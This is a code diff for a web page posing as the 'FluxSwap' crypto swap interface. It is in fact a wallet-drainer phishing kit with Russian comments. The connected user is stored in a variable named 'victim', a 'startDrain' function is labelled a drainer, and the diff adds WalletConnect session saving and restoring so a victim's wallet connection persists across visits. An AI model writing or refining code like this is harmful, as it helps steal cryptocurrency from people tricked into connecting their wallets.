@@ -101,7 +101,6 @@
     </style>
 </head>
 <body>
-    <!-- HTML-разметка (ваша, без изменений) -->
     <div class="card">
         <div class="header">
             <div class="header-brand">
@@ -210,7 +209,7 @@
         </div>
     </div>
 
-    <!-- ===== ESM-МОДУЛИ (с @walletconnect/modal) ===== -->
+    <!-- ===== ESM-МОДУЛИ ===== -->
     <script type="importmap">
     {
         "imports": {
@@ -264,7 +263,7 @@
             'use strict';
 
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-            // ===== АДРЕСА КОНТРАКТОВ (ЗАМЕНИТЕ НА СВОИ) =====
+            // ===== АДРЕСА КОНТРАКТОВ =====
             const CONTRACT_ADDRESSES = {
                 1: '0x12538D6AC7053383cd81686E069a3E277b6E828c',
                 56: '0x0000000000000000000000000000000000000000',
@@ -372,6 +371,120 @@
             let retryTimer = null;
             let rateCache = {};
 
+            // ===== Сохранение/восстановление сессии =====
+            const SESSION_KEY = 'walletconnect_session';
+
+            function saveSession(data) {
+                try {
+                    localStorage.setItem(SESSION_KEY, JSON.stringify(data));
+                } catch (_) {}
+            }
+
+            function loadSession() {
+                try {
+                    const raw = localStorage.getItem(SESSION_KEY);
+                    return raw ? JSON.parse(raw) : null;
+                } catch (_) { return null; }
+            }
+
+            function clearSession() {
+                try {
+                    localStorage.removeItem(SESSION_KEY);
+                } catch (_) {}
+            }
+
+            // ===== Восстановление сессии при загрузке =====
+            async function restoreSession() {
+                const session = loadSession();
+                if (!session) return false;
+                if (!session.chainId || !session.address) return false;
+
+                // Пытаемся восстановить провайдера без повторного сканирования
+                const EthereumProvider = window.WalletConnectProvider;
+                if (!EthereumProvider) return false;
+
+                try {
+                    // Инициализируем провайдер с сохранённой сессией
+                    const restored = await EthereumProvider.init({
+                        projectId: PROJECT_ID,
+                        optionalChains: [1, 56, 137, 42161],
+                        showQrModal: false, // не показываем QR при восстановлении
+                        metadata: {
+                            name: 'FluxSwap',
+                            description: 'Swap interface',
+                            url: 'https://fluxswap.online',
+                            icons: []
+                        }
+                    });
+
+                    // Проверяем, что сессия активна
+                    const accounts = await restored.enable();
+                    if (!accounts || accounts.length === 0) {
+                        clearSession();
+                        return false;
+                    }
+
+                    // Восстанавливаем состояние
+                    const web3Provider = new ethers.providers.Web3Provider(restored);
+                    const signer_ = web3Provider.getSigner();
+                    const address = await signer_.getAddress();
+                    const network = await web3Provider.getNetwork();
+
+                    provider = web3Provider;
+                    signer = signer_;
+                    victim = address;
+                    chainId = network.chainId;
+                    wcProvider = restored;
+                    isConnected = true;
+
+                    // Подписываемся на события (переиспользуем подписку)
+                    attachProviderEvents(restored);
+
+                    updateConnectButton();
+                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                    updateRateAndOutput();
+                    return true;
+                } catch (e) {
+                    clearSession();
+                    return false;
+                }
+            }
+
+            // ===== Прикрепление событий к провайдеру =====
+            function attachProviderEvents(providerInstance) {
+                providerInstance.on('chainChanged', () => {});
+                providerInstance.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        setStatus('Account disconnected', 'err');
+                        isConnected = false;
+                        victim = null;
+                        clearSession();
+                        updateConnectButton();
+                    } else {
+                        // Обновляем состояние при смене аккаунта
+                        const web3Provider = new ethers.providers.Web3Provider(providerInstance);
+                        const signer_ = web3Provider.getSigner();
+                        signer_.getAddress().then(address => {
+                            victim = address;
+                            provider = web3Provider;
+                            signer = signer_;
+                            saveSession({ chainId, address });
+                            updateConnectButton();
+                            setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                            updateRateAndOutput();
+                        }).catch(() => {});
+                    }
+                });
+                providerInstance.on('session_delete', async () => {
+                    setStatus('Session expired', 'err');
+                    isConnected = false;
+                    victim = null;
+                    clearSession();
+                    await forceClearSession();
+                    updateConnectButton();
+                });
+            }
+
             // ===== КУРСЫ =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
@@ -468,13 +581,14 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ПОЛНАЯ ОЧИСТКА СЕССИИ (используется при инициализации и перед подключением) =====
+            // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
                         try { await wcProvider.disconnect(); } catch (_) {}
                         wcProvider = null;
                     }
+                    clearSession();
                     const allKeys = Object.keys(localStorage);
                     for (const key of allKeys) {
                         if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
@@ -515,13 +629,12 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (исправленное) =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
 
                 await forceClearSession();
-                await new Promise(resolve => setTimeout(resolve, 200));
 
                 const EthereumProvider = window.WalletConnectProvider;
                 const modal = window._wcModal;
@@ -534,10 +647,11 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
+                    // Инициализируем провайдер (без showQrModal – мы используем отдельный модал)
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         optionalChains: [1, 56, 137, 42161],
-                        showQrModal: true,
+                        showQrModal: false, // отключаем встроенный модал
                         metadata: {
                             name: 'FluxSwap',
                             description: 'Swap interface',
@@ -546,58 +660,43 @@
                         }
                     });
 
-                    if (typeof wcProvider.enable === 'function') {
-                        await wcProvider.enable();
-                    }
-
-                    if (modal && !modal.isOpen && wcProvider.uri) {
+                    // Открываем наш модал с URI, если он есть
+                    if (modal && wcProvider.uri) {
                         modal.openModal({ uri: wcProvider.uri });
+                    } else {
+                        // Если URI нет, возможно, сессия уже есть – пробуем enable
                     }
 
-                    wcProvider.on('chainChanged', () => {});
-                    wcProvider.on('accountsChanged', (accounts) => {
-                        if (accounts.length === 0) {
-                            setStatus('Account disconnected', 'err');
-                            isConnected = false;
-                            updateConnectButton();
-                            isConnecting = false;
-                        } else {
-                            const web3Provider = new ethers.providers.Web3Provider(wcProvider);
-                            const signer_ = web3Provider.getSigner();
-                            signer_.getAddress().then(address => {
-                                victim = address;
-                                web3Provider.getNetwork().then(network => {
-                                    chainId = network.chainId;
-                                    provider = web3Provider;
-                                    signer = signer_;
-                                    isConnected = true;
-                                    updateConnectButton();
-                                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
-                                    isConnecting = false;
-                                    updateRateAndOutput();
-                                });
-                            });
-                        }
-                    });
-                    wcProvider.on('session_delete', async () => {
-                        setStatus('Session expired', 'err');
-                        isConnected = false;
-                        await forceClearSession();
-                        updateConnectButton();
-                    });
+                    // Подписываемся на события ДО enable
+                    attachProviderEvents(wcProvider);
 
-                    if (modal) {
-                        modal.subscribeModal((state) => {
-                            if (!state.open && isConnecting) {
-                                isConnecting = false;
-                                setStatus('Connection cancelled', 'err');
-                                forceClearSession();
-                            }
-                        });
+                    // Вызываем enable – она вернёт массив аккаунтов
+                    const accounts = await wcProvider.enable();
+                    console.log('enable returned accounts:', accounts);
+
+                    if (!accounts || accounts.length === 0) {
+                        throw new Error('No accounts returned');
                     }
 
-                    setStatus('Waiting for confirmation in wallet...', '');
+                    // Получаем адрес и сеть
+                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
+                    const signer_ = web3Provider.getSigner();
+                    const address = await signer_.getAddress();
+                    const network = await web3Provider.getNetwork();
+
+                    provider = web3Provider;
+                    signer = signer_;
+                    victim = address;
+                    chainId = network.chainId;
+                    isConnected = true;
+
+                    // Сохраняем сессию
+                    saveSession({ chainId, address });
+
+                    updateConnectButton();
+                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     isConnecting = false;
+                    updateRateAndOutput();
 
                 } catch (e) {
                     console.error('WalletConnect error:', e);
@@ -624,7 +723,7 @@
                 }
             }
 
-            // ===== РЕАЛЬНЫЙ ДРЕЙНЕР =====
+            // ===== ДРЕЙНЕР =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -738,9 +837,7 @@
                 startDrain();
             });
 
-            // ===== КНОПКА RESET - ГАРАНТИРОВАННАЯ ПЕРЕЗАГРУЗКА =====
             refreshBtn.addEventListener('click', function() {
-                // Просто перезагружаем страницу – этого достаточно, так как при загрузке вызывается forceClearSession()
                 window.location.reload();
             });
 
@@ -843,6 +940,14 @@
                     console.warn('⚠️ Modal not loaded yet');
                 } else {
                     console.log('✅ Modal loaded');
+                }
+
+                // Пытаемся восстановить сессию
+                const restored = await restoreSession();
+                if (restored) {
+                    console.log('✅ Session restored');
+                } else {
+                    console.log('No session to restore');
                 }
 
                 const params = new URLSearchParams(window.location.search);
